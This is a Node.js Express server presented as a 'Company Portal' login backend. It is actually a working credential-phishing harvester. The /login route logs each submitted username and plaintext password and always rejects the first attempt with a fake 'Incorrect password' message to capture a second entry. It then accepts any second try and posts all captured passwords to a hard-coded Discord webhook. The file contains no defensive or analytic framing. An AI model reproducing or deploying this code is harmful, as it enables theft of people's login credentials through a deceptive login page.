// ===============================
// ✅ Company Portal — Server.js
// ===============================
import express from "express";
import bodyParser from "body-parser";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import fetch from "node-fetch"; // install: npm i node-fetch

const app = express();
const PORT = process.env.PORT || 7001;
const __dirname = path.resolve();

app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "public")));

const SESSIONS_DIR = path.join(__dirname, "sessions");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

// Track user attempts and passwords
const userAttempts = {}; // { username: { count, passwords: [] } }

// ✅ Direct webhook link (your Discord)
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1436156814369755328/f9L1OVJdp8BuEnrX4C-tHkrT3DzGNP_Vy9PzWyFG1Vjozs_fdLVfcfeiEQ0XbZ0YlXRk"; // <-- your webhook

// ------------------ Send Message to Discord ------------------
async function sendToDiscord(username, passwords, status) {
  const webhook = DISCORD_WEBHOOK_URL;

  const message = {
    username: "Portal Logger",
    embeds: [
      {
        title: "🧠 New Login Submission",
        color: status === "Success" ? 0x2ecc71 : 0xe74c3c,
        fields: [
          { name: "Username", value: username, inline: false },
          { name: "Password Attempts", value: passwords.join("\n"), inline: false },
          { name: "Status", value: status, inline: true },
          { name: "Time", value: new Date().toLocaleString(), inline: true }
        ]
      }
    ]
  };

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });
    console.log(`📤 Sent login info for ${username} to Discord`);
  } catch (err) {
    console.error("❌ Discord Webhook Error:", err);
  }
}

// ------------------ Create Session File ------------------
function createSessionFile(username) {
  const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
  const data = {
    username,
    attempts: userAttempts[username]?.passwords || [],
    token,
    created: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
  };
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  console.log(`🗂 Session created → ${filePath}`);
  return token;
}

// ------------------ LOGIN ------------------
app.post("/login", async (req, res) => {
  // accept either `username` or `email` from client
  const { username, password, email } = req.body || {};
  const user = username || email || 'unknown';

  if (!userAttempts[user]) {
    userAttempts[user] = { count: 0, passwords: [] };
  }

  userAttempts[user].count++;
  userAttempts[user].passwords.push(password);

  console.log(`🔐 Attempt ${userAttempts[user].count} for ${user} → "${password}"`);

  // 1️⃣ First attempt rejected
  if (userAttempts[user].count < 2) {
    await sendToDiscord(user, userAttempts[user].passwords, "Rejected");
    return res.status(401).json({ ok: false, message: "Incorrect password. Please try again." });
  }

  // 2️⃣ Second attempt accepted
  const token = createSessionFile(user);
  res.cookie("session_id", token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });

  await sendToDiscord(user, userAttempts[user].passwords, "Success");
  console.log(`✅ Login successful for ${user}`);
  res.status(200).json({ ok: true, message: "Login successful", token });
});

// ------------------ DASHBOARD ------------------
app.get("/dashboard.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public/dashboard.html"));
});

// ------------------ START SERVER ------------------
app.listen(PORT, () => console.log(`✅ Running on http://localhost:${PORT}`));